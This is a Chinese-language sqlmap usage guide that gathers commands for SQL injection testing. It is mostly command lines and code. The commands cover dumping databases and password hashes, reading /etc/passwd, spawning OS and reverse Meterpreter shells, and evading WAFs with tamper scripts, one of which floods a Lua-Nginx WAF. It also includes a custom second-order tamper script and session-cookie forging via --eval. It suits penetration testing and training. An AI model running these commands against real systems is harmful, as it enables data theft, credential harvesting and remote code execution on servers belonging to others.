---
attack_surface: [注入类]
impact: [信息泄露, 远程代码执行]
risk_level: 高
difficulty: 初级
related_techniques:
  - sql-injection
tools:
  - sqlmap
---

# sqlmap 使用指南 — 从入门到高级利用

> 关联文档：[SQL Injection 总览](../README.md) · [MySQL Injection](../MySQL%20Injection.md) · [MSSQL Injection](../MSSQL%20Injection.md)

---

# 0x01 基础参数

```bash
-u "<URL>"                   # 目标 URL
-p "<PARAM>"                 # 指定测试参数
--user-agent=SQLMAP          # 自定义 UA
--random-agent               # 随机 UA
--threads=10                 # 线程数
--risk=3                     # 风险等级 (MAX)
--level=5                    # 测试深度 (MAX)
--dbms="<DB TECH>"           # 指定数据库类型
--os="<OS>"                  # 指定操作系统
--technique="UB"             # 限定技术 (默认 BEUSTQ)
--batch                      # 非交互模式 (接受默认)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2"       # 自定义 UNION 字符辅助检测
```

---

# 0x02 技术标志 (`--technique`)

| 字母 | 技术 | 说明 |
|------|------|------|
| **B** | Boolean-based blind | TRUE/FALSE 条件推断 |
| **E** | Error-based | 利用详细错误消息提取 |
| **U** | UNION query | UNION SELECT 注入提取 |
| **S** | Stacked queries | 追加分号分隔语句 |
| **T** | Time-based blind | SLEEP/WAITFOR 延迟检测 |
| **Q** | Inline / Out-of-band | LOAD_FILE() / DNS 外带 |

默认顺序 `BEUSTQ`。可重排或限制：

```bash
sqlmap -u "http://target/?id=1" --technique="BT" --batch
```

---

# 0x03 注入位置

```bash
# Burp/ZAP 请求文件
sqlmap -r req.txt --current-user

# GET
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id

# POST
sqlmap -u "http://example.com" --data "username=*&password=*"

# Cookie
sqlmap -u "http://example.com" --cookie "mycookies=*"

# Headers
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

# PUT 方法
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

# * 号标记注入点
```

---

# 0x04 信息提取

```bash
# 内部信息
--current-user          # 当前用户
--is-dba                # 是否 DBA
--hostname              # 主机名
--users                 # 列出所有用户
--passwords             # 密码哈希
--privileges            # 用户权限

# 数据库数据
--all                   # 全部提取
--dump                  # 导出表内容
--dbs                   # 列出数据库
--tables -D <DB>        # 列出表
--columns -D <DB> -T <T> # 列出列
-D <DB> -T <T> -C <C>   # 导出指定列

# 文件读取
--file-read=/etc/passwd
```

---

# 0x05 Shell

```bash
# 执行命令
sqlmap -u "http://example.com/?id=1" -p id --os-cmd whoami

# 简单 Shell
sqlmap -u "http://example.com/?id=1" -p id --os-shell

# 反弹 Shell / Meterpreter
sqlmap -u "http://example.com/?id=1" -p id --os-pwn
```

---

# 0x06 自定义注入

```bash
# 前缀
python sqlmap.py -u "http://example.com/?id=1" -p id --prefix="') "

# 后缀
python sqlmap.py -u "http://example.com/?id=1" -p id --suffix="-- "

# 布尔盲注辅助
sqlmap -r r.txt -p id --not-string "ridiculous" --batch
# --not-string: 指定 True 响应中不出现的字符串
```

---

# 0x07 Tamper 脚本

```bash
--tamper=name_of_the_tamper
# Kali: /usr/share/sqlmap/tamper
```

| Tamper | 说明 |
|--------|------|
| **apostrophemask.py** | UTF-8 全角单引号替换 |
| **apostrophenullencode.py** | 非法双 Unicode 单引号 |
| **base64encode.py** | Base64 编码 payload |
| **between.py** | `>` → `NOT BETWEEN 0 AND #` |
| **commalesslimit.py** | `LIMIT M,N` → `LIMIT N OFFSET M` |
| **commalessmid.py** | `MID(A,B,C)` → `MID(A FROM B FOR C)` |
| **equaltolike.py** | `=` → `LIKE` |
| **randomcomments.py** | 关键字间插入随机注释 |
| **space2comment.py** | 空格 → 注释 |
| **space2mysqlblank.py** | 空格 → MySQL 替代空白符 |
| **space2mssqlblank.py** | 空格 → MSSQL 替代空白符 |
| **unmagicquotes.py** | 宽字节 `%bf%27` 绕过 addslashes |
| **uppercase.py** | 关键字全大写 |
| **versionedkeywords.py** | MySQL 版本注释封装 |
| **xforwardedfor.py** | 追加 X-Forwarded-For 头 |
| **luanginxmore.py** | 生成 ~4.2M 虚假 POST 参数压垮 Lua-Nginx WAF (仅 POST) |

---

# 0x08 Second-Order Injection

```bash
# 简单 Second-Order
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"
sqlmap -r login.txt -p username --second-req details.txt
```

## 复杂 Second-Order (自定义 Tamper)

当需要多个步骤（注册→登录→触发）时：

```python
#!/usr/bin/env python
# tamper.py
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def login_account(payload):
    proxies = {'http': 'http://127.0.0.1:8080'}
    cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}
    params = {"username": "test", "email": payload, "password": "11111111"}
    url = "http://10.10.10.10/create.php"
    requests.post(url, data=params, cookies=cookies, verify=False, proxies=proxies)
    requests.get("http://10.10.10.10/exit.php", cookies=cookies, verify=False, proxies=proxies)

def tamper(payload, **kwargs):
    login_account(payload)
    return payload
```

```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt \
  --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U \
  --dbms mysql --union-char "DTEC" -a
```

## Second-Order 高级开关

```bash
sqlmap -r login.txt -p email \
  --second-req second.txt \
  --csrf-token csrf \
  --csrf-url https://target.tld/profile \
  --csrf-method POST \
  --live-cookies cookies.txt \
  --safe-req keepalive.txt \
  --safe-freq 1 \
  --string "Welcome back" \
  --text-only
```

---

# 0x09 Eval — 动态 Payload 处理

```bash
sqlmap http://1.1.1.1/sqli \
  --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" \
  --cookie="session=*" --dump
```

---

# 0x0A 新版本开关 (≥1.9.x)

```bash
--http2                  # HTTP/2 传输 (绕过 HTTP/1.1 速率限制)
--proxy-file proxies.txt # 代理列表轮换
--proxy-freq 3           # 每 3 次请求更换代理
--offline                # 仅使用缓存数据 (零网络流量)
--purge                  # 完成后清理 session/output 目录
--mobile                 # 模拟移动端 UA
```

---

# 0x0B 爬取与自动利用

```bash
sqlmap -u "http://example.com/" \
  --crawl=1 \          # 爬取深度
  --random-agent \     # 随机 UA
  --batch \            # 非交互
  --forms \            # 解析并测试表单
  --threads=5 \        # 线程数
  --level=5 \          # 最大测试深度
  --risk=3             # 最大风险
```

---

# 0x0C 在线生成器

- [SQLMapping — sqlmap 命令图形化生成器](https://taurusomar.github.io/sqlmapping/)
- [sqlmap Command Builder](https://vizzdoom.github.io/sqlmap-command-builder/)

---

# 0x0D 参考资料

- [sqlmap Official Usage Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [sqlmap Second Order SQLi Guide](https://jlajara.gitlab.io/Second_order_sqli)
